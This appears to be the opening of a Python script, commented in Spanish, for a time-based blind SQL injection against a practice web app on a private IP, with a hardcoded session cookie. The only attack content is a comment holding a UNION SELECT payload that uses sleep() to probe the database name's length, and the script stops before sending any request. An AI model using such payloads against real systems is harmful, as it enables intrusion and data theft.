import requests
import time

server = "http://10.0.99.24" #  servidor
cookie = "language=en; welcomebanner_status=dismiss; continueCode=POq8XxDzbkeJ7mY61E2joZGmMTNizSDgUbwTpYGLNgpK9BRya5Ww3lQ4VvnM; cookieconsent_status=dismiss; security=low; PHPSESSID=ah4bb2qv004g0pojm07jr24376"

espera=2
# Obtener longitud del nombre de la base de datos
# 1' UNION SELECT NULL,IF(length(database())=1,sleep(2),'a') --

